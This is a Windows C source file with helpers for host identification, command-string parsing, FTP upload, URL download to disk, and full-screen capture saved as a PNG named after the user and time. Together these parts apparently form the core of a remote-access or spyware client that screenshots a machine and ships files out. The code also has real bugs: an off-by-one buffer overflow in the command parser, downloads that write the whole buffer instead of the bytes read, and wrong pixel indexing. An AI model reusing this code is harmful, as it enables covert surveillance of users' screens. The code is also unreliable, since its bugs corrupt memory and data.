#include <stdio.h>
#include <stdint.h>
#include <windows.h>
#include <wininet.h>
#include "png/lodepng.h"

uint64_t getHostId(void)
{
	DWORD serial;
	GetVolumeInformation(NULL, NULL, 0, &serial, NULL, NULL, NULL, 0);
	return serial;
}

BOOL FileExists(const TCHAR *file)
{
    return 0xFFFFFFFF != GetFileAttributes(file);
}

TCHAR **parseCommand(TCHAR *s, int *argc)
{
	TCHAR *args = (TCHAR*) malloc(strlen(s));
	int index = 0;
	int isIn = 0;
	int count = 1;
	TCHAR last = 0;

	for (; *s; s++)
	{
		switch(*s)
		{
			case ' ':
				if (isIn)
				{
					args[index++] = *s;
				}
				else if (last != ' ')
				{
					args[index++] = 0;
					count++;
				}

				break;
			case '"':
				isIn = !isIn;
				break;
			default:
				args[index++] = *s;
		}

		last = *s;
	}
	args[index] = '\0';

	char **argv = calloc(count, sizeof(TCHAR *));
	*argc = count;
	index = 0;

    while (count--)
    {
        argv[index++] = args;
		while (*args++);
    }

    return argv;
}


int FtpSendFile(
	const TCHAR * host,
	const TCHAR * dir,
	const TCHAR * localFile,
	const TCHAR * remoteFile,
	const TCHAR * user,
	const TCHAR * pass,
	BOOL useAscii)
{
	if (! FileExists(localFile))
	{
		return 1;
	}

	HINTERNET hOpen = InternetOpen("byK13", INTERNET_OPEN_TYPE_DIRECT, "", "", 0);
	if (hOpen == NULL)
	{
		return 2;
	}

	HINTERNET hConnect = InternetConnect(
		hOpen,
		host,
		INTERNET_DEFAULT_FTP_PORT,
		user,
		pass,
		INTERNET_SERVICE_FTP,
		INTERNET_FLAG_PASSIVE,
		0);
	if (hConnect == NULL)
	{
		InternetCloseHandle(hOpen);

		return 3;
	}

	if (! FtpSetCurrentDirectory(hConnect, dir))
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hOpen);

		return 4;
	}

	int code = 0;

	if (! FtpPutFile(hConnect, localFile, remoteFile, useAscii ? FTP_TRANSFER_TYPE_ASCII : FTP_TRANSFER_TYPE_BINARY, 0))
	{
		code = 5;
	}

	InternetCloseHandle(hConnect);
	InternetCloseHandle(hOpen);

	return code;
}

int URLDownloadToFile(
    TCHAR * const url,
    TCHAR * const path)
{
	if (FileExists(path))
	{
		return 1;
	}

	HINTERNET hSession = InternetOpen("byK13", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hSession == NULL)
	{
		return 2;
	}

	HINTERNET hUrl = InternetOpenUrl(hSession, url, NULL, 0, 0, 0);
	if (hUrl == NULL)
	{
		return 3;
	}

	BYTE buff[1024];
	FILE *f = fopen(path, "wb+");
	DWORD read = 0;
	do
	{
		if (! InternetReadFile(hUrl, buff, sizeof(buff), &read))
		{
			InternetCloseHandle(hUrl);
			InternetCloseHandle(hSession);
			fclose(f);
			return 4;
		}

		fwrite(buff, sizeof(BYTE), sizeof(buff), f);

	} while (read);

	fclose(f);

	return 0;
}

TCHAR *basename(TCHAR * path)
{
    TCHAR *s = strrchr(path, '\\');
    return s ? strdup(s + 1) : strdup(path);
}

void saveSS(TCHAR *path, DWORD buff_len)
{
    BITMAPINFO bi;
    memset(&bi, 0, sizeof(BITMAPINFO));

    int width   = GetSystemMetrics(SM_CXSCREEN);
    int height  = GetSystemMetrics(SM_CYSCREEN);
    char depth  = GetSystemMetrics(BITSPIXEL);

    HDC hScreenDC = GetDC(HWND_DESKTOP);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);

    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

    memset(&bi, 0, sizeof(BITMAPINFO));

    bi.bmiHeader.biSize = sizeof(BITMAPINFO);
    GetDIBits(hScreenDC, hBitmap, 0, 0, NULL, &bi, DIB_RGB_COLORS);

    BYTE* bmp = malloc(bi.bmiHeader.biSizeImage);
    BYTE* pixels = malloc(width * height * 4);

    bi.bmiHeader.biWidth  = width;
    bi.bmiHeader.biHeight = -height;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = depth;
    bi.bmiHeader.biCompression = BI_RGB;

    GetDIBits(hScreenDC, hBitmap, 0, height, bmp, &bi, DIB_RGB_COLORS);

    DeleteObject(hMemoryDC);
    DeleteDC(hScreenDC);

    int x, y;
    for(y = 0; y < height; y++)
    for(x = 0; x < width; x++)
    {
        if (depth == 24)
        {
            int pos = (width * y + x) * 3;

            pixels[pos + 0] = bmp[pos + 2];
            pixels[pos + 1] = bmp[pos + 1];
            pixels[pos + 2] = bmp[pos + 0];
            pixels[pos + 3] = 0xFF;
        }
        else
        {
            int pos = (width * y + x) * 4;

            pixels[pos + 0] = bmp[pos + 2];
            pixels[pos + 1] = bmp[pos + 1];
            pixels[pos + 2] = bmp[pos + 0];
            pixels[pos + 3] = bmp[pos + 3];
        }
    }

    TCHAR temp[MAX_PATH];
    GetTempPath(MAX_PATH, temp); // czytanie ściezki do folderu temp

    SYSTEMTIME time;
    GetSystemTime(&time); // czytanie czasu systemowego

    TCHAR user[256];
    DWORD len = sizeof(user);
    GetUserName(user, &len);

    TCHAR fname[MAX_PATH];
    sprintf(fname,
        "%s_%04d%02d%02d_%02d%02d%02d.png",
        user,
        time.wYear, time.wMonth, time.wDay,
        time.wHour, time.wMinute, time.wSecond
    );

    strcpy(path, temp);
    strcat(path, fname);

    lodepng_encode32_file(path, pixels, width, height);

    printf("save ss to %s\n", path);

    free(bmp);
    free(pixels);
}
